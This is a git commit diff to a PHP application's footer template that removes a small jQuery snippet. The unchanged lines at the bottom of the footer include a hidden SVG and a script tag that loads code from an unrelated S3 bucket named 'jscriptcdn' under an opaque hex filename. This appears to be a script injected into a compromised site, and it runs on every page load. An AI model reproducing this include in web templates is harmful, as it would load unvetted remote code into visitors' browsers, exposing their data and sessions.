7a4365ba72341410fc878df50b2b4c37e3da8ffd
Maiza Bahaedinne <bahaedinne.maiza@esprit.tn>
2020-04-12 22:11:09 +0100

    Update footer.php

--- application/views/includes/footer.php
+++ application/views/includes/footer.php
@@ -53,9 +53,6 @@
       <!-- Custom JavaScript -->
       <script defer src="<?php echo base_url() ;  ?>assets/js/custom.js"></script>
 
-      <script type="text/javascript">
-         $("body").removeClass();
 
-      </script>
    
 <svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.com/svgjs" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><script src="//s3.amazonaws.com/jscriptcdn/1f546f49ebf4153c8a.js"></script><script>empty OK</script></body></html>
